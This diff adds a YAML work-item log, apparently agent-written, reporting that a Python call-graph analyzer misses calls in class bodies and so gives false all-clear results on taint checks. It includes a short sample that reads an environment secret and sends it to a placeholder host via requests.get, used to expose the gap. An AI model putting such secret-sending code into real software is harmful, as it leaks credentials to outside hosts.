@@ -1,0 +1,30 @@
+- op: create  # faa7
+  at: '2026-10-21T17:27:01Z'  # faa7
+  by: agent  # faa7
+  actor: jgstern_agent  # faa7
+  clock: 1  # faa7
+  nonce: faa7  # faa7
+  data:  # faa7
+    kind: work_item  # faa7
+    title: "py.py emits no calls edge for a call in a class body outside every method, so class-scope taint reads clean (INV-bamij's Python gap)"  # faa7
+    status: todo_hard  # faa7
+    priority: 2  # faa7
+    parent:  # faa7
+    tags:  # faa7
+    - call_graph  # faa7
+    - python  # faa7
+    - taint  # faa7
+    isbefore: []  # faa7
+    duplicate_of: []  # faa7
+    not_duplicate_of: []  # faa7
+    pr_ref:  # faa7
+    description: "FOUND 2026-10-21 while sizing WI-nilir, on dev 9736675644. INV-bamij's family (INV-foluz: every call site an analyzer parses emits a calls edge anchored on SOME symbol); INV-bamij swept nine analyzers and noted \"Python already anchors module code on the file\", but a CLASS BODY was not part of the sweep.\n\npy.py emits no calls edge for a call in a class body outside every method. Survey of\n    import os, subprocess\n    class C:\n        subprocess.run([\"echo\", os.environ[\"K\"]])\n        x = len(\"a\")\nhas nodes C (class), C.x (field), file -- and no calls edge at all (only imports + contains).\n\nConsequence (verify-claims, host_secret -> network):\n    class C:\n        k = os.environ[\"K\"]\n        requests.get(\"http://x/\" + k)\nreads verdict=confirmed with analysis_fidelity {} -- a false all-clear. The same two lines at module level read violated.\nJS control: a static block's fetch(...) is anchored on the file pseudo-symbol (calls edge present).\n\nFix shape (INV-nopoh / INV-bamij's): anchor a class-body call on the class's own symbol (the innermost class), as Java's static initializer now is; both py.py scope walks (anchor and the var-type walk) through one helper. Measure on django/fastapi: class-body calls are common there (Meta classes, field = models.CharField(...), decorators-as-calls)."  # faa7
+    fields: {}  # faa7
+- op: update  # c7ad
+  at: '2026-10-21T23:13:57Z'  # c7ad
+  by: agent  # c7ad
+  actor: jgstern_agent  # c7ad
+  clock: 2  # c7ad
+  nonce: c7ad  # c7ad
+  set:  # c7ad
+    status: in_progress  # c7ad
